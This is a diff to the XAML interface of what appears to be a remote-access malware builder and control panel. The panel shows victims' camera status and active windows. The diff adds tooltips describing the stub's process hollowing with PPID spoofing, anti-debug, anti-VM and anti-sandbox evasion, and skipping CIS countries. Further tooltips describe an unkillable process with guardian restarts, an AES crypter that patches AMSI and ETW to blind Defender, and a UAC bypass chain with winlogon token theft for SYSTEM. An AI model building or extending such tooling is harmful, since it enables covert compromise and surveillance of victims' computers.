@@ -626,7 +626,7 @@
                                     <DataGridTextColumn Header="CPU"      Binding="{Binding CpuDisplay}"   Width="130" FontSize="11"/>
                                     <DataGridTextColumn Header="GPU"      Binding="{Binding GpuDisplay}"   Width="130" FontSize="11"/>
                                     <DataGridTextColumn Header="RAM"      Binding="{Binding RamDisplay}"   Width="105" FontFamily="Consolas" FontSize="11"/>
-                                    <DataGridTextColumn Header="CAM"       Binding="{Binding CameraStatus}" Width="44"  FontSize="11"/>
+                                    <DataGridTextColumn Header="CAM"       Binding="{Binding CameraIcon}"   Width="44"  FontSize="13"/>
                                     <DataGridTextColumn Header="WINDOW"    Binding="{Binding ActiveWindow}" Width="140" />
                                     <DataGridTextColumn Header="TAG"       Binding="{Binding Tag}"                                Width="80"  />
                                     <DataGridTemplateColumn Header="PING"  Width="70" MinWidth="50" SortMemberPath="PingMs">
@@ -929,7 +929,8 @@
                                     <StackPanel>
                                         <TextBlock Text="PROCESS HOLLOWING" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
-                                        <CheckBox x:Name="BldHollowing" Content="Auto-inject into legitimate process" Style="{StaticResource SChk}" />
+                                        <CheckBox x:Name="BldHollowing" Content="Auto-inject into legitimate process" Style="{StaticResource SChk}"
+                                                  ToolTip="Process Hollowing: the stub creates a suspended copy of the target process (e.g. svchost.exe), unmaps its original code, maps the stub PE in its place, then resumes execution. The stub appears in Task Manager as a legitimate Windows process. PPID is spoofed to explorer.exe to break suspicious parent-child chains." />
                                         <StackPanel Margin="0,4,0,0"
                                                     Visibility="{Binding IsChecked, ElementName=BldHollowing, Converter={StaticResource BoolToVis}}">
                                             <TextBlock Text="TARGET PROCESS" Style="{StaticResource SFieldLabel}" />
@@ -998,12 +999,16 @@
                                     <StackPanel>
                                         <TextBlock Text="PROTECTION" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
-                                        <CheckBox x:Name="BldAntiDebug"   Content="Anti-Debug"                                     Style="{StaticResource SChk}" IsChecked="True" />
-                                        <CheckBox x:Name="BldAntiVM"      Content="Anti-VM"                                        Style="{StaticResource SChk}" IsChecked="True" />
-                                        <CheckBox x:Name="BldAntiDetect"  Content="Anti-Detect (analysis tools)"                   Style="{StaticResource SChk}" IsChecked="True" />
-                                        <CheckBox x:Name="BldAntiSandbox" Content="Anti-Sandbox"                                   Style="{StaticResource SChk}" IsChecked="True" />
+                                        <CheckBox x:Name="BldAntiDebug"   Content="Anti-Debug"                                     Style="{StaticResource SChk}" IsChecked="True"
+                                                  ToolTip="Detects debuggers using multiple methods: IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess (DebugPort), NtSetInformationThread (ThreadHideFromDebugger), and a timing-based check. If a debugger is detected the stub exits silently." />
+                                        <CheckBox x:Name="BldAntiVM"      Content="Anti-VM"                                        Style="{StaticResource SChk}" IsChecked="True"
+                                                  ToolTip="Detects virtual machines by checking BIOS registry strings for VMware/VirtualBox keywords, VMware Tools registry key, and VirtualBox Guest Additions. Exits silently if a VM is detected." />
+                                        <CheckBox x:Name="BldAntiDetect"  Content="Anti-Detect (analysis tools)"                   Style="{StaticResource SChk}" IsChecked="True"
+                                                  ToolTip="Scans running processes for known analysis tools: x64dbg, IDA Pro, OllyDbg, Wireshark, Process Hacker, Fiddler, Ghidra, and others. Also checks for suspicious usernames (sandbox accounts) and blocks execution in CIS countries (RU/BY/KZ/UA/AM etc.)." />
+                                        <CheckBox x:Name="BldAntiSandbox" Content="Anti-Sandbox"                                   Style="{StaticResource SChk}" IsChecked="True"
+                                                  ToolTip="Scores the environment across multiple indicators: uptime under 3 minutes, sleep-acceleration detection (checks if Sleep() returns faster than expected), fewer than 3 temp files, under 1 GB RAM, fewer than 8 installed programs. Exits if the score exceeds the sandbox threshold." />
                                         <CheckBox x:Name="BldAntiKill"    Content="Anti-Kill"                                      Style="{StaticResource SChk}" IsChecked="False"
-                                                  ToolTip="DACL (deny TERMINATE) + guardian + WMI persistence. Redémarre le process s'il est tué."
+                                                  ToolTip="Protects the stub process from being killed: sets an empty DACL (denies PROCESS_TERMINATE and PROCESS_SUSPEND_RESUME for Everyone) so Task Manager, Process Explorer, and taskkill.exe fail with Access Denied. Also spawns 4 guardian processes in dllhost.exe / SearchProtocolHost.exe with PPID spoofing that restart the stub if it is killed. Windows shutdown bypasses DACL cleanly — no BSOD on reboot."
                                                   Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                         <TextBlock x:Name="TxtMaxPersist" Margin="18,2,0,0" FontSize="10"
                                                    Foreground="#22C55E" FontWeight="SemiBold"
@@ -1017,11 +1022,12 @@
                                     <StackPanel>
                                         <TextBlock Text="OBFUSCATION" FontSize="9" FontWeight="Bold"
                                                    Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
-                                        <CheckBox x:Name="BldEncrypt"   Content="Crypter (AES-256, polymorphic, AMSI+ETW bypass) — closed-source"  Style="{StaticResource SChk}" />
+                                        <CheckBox x:Name="BldEncrypt"   Content="Crypter (AES-256, polymorphic, AMSI+ETW bypass) — closed-source"  Style="{StaticResource SChk}"
+                                                  ToolTip="Wraps the stub in a native C++ loader that: (1) compresses with LZNT1, (2) encrypts with AES-256-CBC using a random per-build key split across 3 binary locations, (3) patches ETW (EtwEventWrite) and AMSI (AmsiScanBuffer) in memory before executing the stub so Defender cannot scan it. Polymorphic: random key, random function names, random junk code, unique BuildId GUID per build." />
                                         <CheckBox x:Name="BldUacBypass" Content="UAC Bypass + SYSTEM elevation (fodhelper chain) — closed-source" Style="{StaticResource SChk}"
-                                                  ToolTip="① fodhelper UAC bypass (ms-settings HKCU hijack). ② SeDebugPrivilege + vol de token winlogon.exe pour SYSTEM." />
+                                                  ToolTip="Step 1 — UAC Bypass: tries a chain of methods silently without showing a UAC prompt (SilentCleanup task hijack → fodhelper ms-settings → sdclt → computerdefaults → mmc). Step 2 — SYSTEM elevation: once admin, acquires SeDebugPrivilege, duplicates the token from winlogon.exe, and relaunches the stub as SYSTEM." />
                                         <CheckBox x:Name="BldUpx" Content="UPX compression (upx.exe must be in PATH or tools/)" Style="{StaticResource SChk}"
-                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces ~8 MB → ~3.5 MB. Requires upx.exe." />
+                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces ~8 MB → ~3.5 MB. Requires upx.exe in PATH or in the tools/ folder next to SeroServer.exe." />
                                         <Border Margin="18,2,0,0" Padding="8,5"
                                                 Background="#1AF59E0B" BorderBrush="#60F59E0B"
                                                 BorderThickness="1" CornerRadius="5"
@@ -1403,7 +1409,13 @@
                             <TextBlock Text="Rejects new connections when this limit is reached." Foreground="#606880" FontSize="11" Margin="0,0,0,24" />
 
                             <TextBlock Text="INTEGRATIONS" Style="{StaticResource SLabel}" />
-                            <CheckBox x:Name="SettingsDiscordRPC" Content="Discord Rich Presence" Style="{StaticResource SChk}" Margin="0,0,0,24" />
+                            <CheckBox x:Name="SettingsDiscordRPC" Content="Discord Rich Presence" Style="{StaticResource SChk}" Margin="0,0,0,8" />
+                            <CheckBox x:Name="SettingsNotifySound" Content="Connection sound notifications" Style="{StaticResource SChk}" Margin="0,0,0,24"
+                                      Checked="SettingsNotifySound_Changed" Unchecked="SettingsNotifySound_Changed" />
+
+                            <TextBlock Text="APPEARANCE" Style="{StaticResource SLabel}" />
+                            <CheckBox x:Name="SettingsHideLogo" Content="Hide background logo (dark mode)" Style="{StaticResource SChk}" Margin="0,0,0,24"
+                                      Checked="SettingsHideLogo_Changed" Unchecked="SettingsHideLogo_Changed" />
 
                             <TextBlock Text="PORT CHECKER" Style="{StaticResource SLabel}" />
                             <StackPanel Orientation="Horizontal" Margin="0,0,0,8">
